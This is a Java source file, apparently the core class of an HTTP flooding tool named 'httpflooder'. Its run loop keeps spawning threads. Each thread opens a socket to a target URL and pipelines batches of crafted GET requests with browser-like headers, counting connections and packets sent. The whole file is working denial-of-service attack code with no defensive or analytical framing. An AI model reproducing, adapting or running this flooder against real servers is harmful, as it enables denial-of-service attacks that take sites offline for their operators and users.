package com.github.mhprodev.httpflooder;


import java.io.BufferedOutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class Attack implements Runnable {
    @Override
    public void run() {
        while (!Main.isRunning()) {
            try {
                Thread.sleep(1000);
            } catch (InterruptedException ignored) {

            }
        }
        while (Main.isRunning()) {
            new Thread(() -> {
                try (Socket socket = new Socket()) {
                    socket.setTcpNoDelay(true);
                    socket.setSoTimeout(1000);
                    try {
                        socket.connect(new InetSocketAddress(Main.getUrl().getHost(), Main.getUrl().getPort()));
                    } catch (Exception ignored) {
                        socket.connect(new InetSocketAddress(Main.getUrl().getHost(), Main.getUrl().getDefaultPort()));
                    }

                    try (BufferedOutputStream writer = new BufferedOutputStream(socket.getOutputStream())) {
                        Main.cps++;
                        for (int i = 0; (i < Main.getRpc() + 1 && socket.isConnected()); i++) {
                            writer.write(String.format("GET /%s HTTP/1.1\r\n", Main.getUrl().getPath())
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write(String.format("Host: %s\r\n", Main.getUrl().getAuthority())
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Connection: keep-alive\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Accept-Encoding: gzip, deflate, br\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Accept-Language: en-US,en;q=0.9\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Cache-Control: max-age=0\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Sec-Fetch-Dest: document\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write(("User-agent: hacker\r\n" +
                                    "").getBytes(StandardCharsets.UTF_8));
                            writer.write("Sec-Fetch-Mode: navigate\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Sec-Fetch-Site: none\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Sec-Fetch-User: ?1\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Sec-Gpc: 1\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Pragma: no-cache\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("Upgrade-Insecure-Requests: 1\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.write("\r\n"
                                    .getBytes(StandardCharsets.UTF_8));
                            writer.flush();
                            Main.pps++;
                        }
                    }
                } catch (Exception ignored) {

                }
            }).start();
        }
    }
}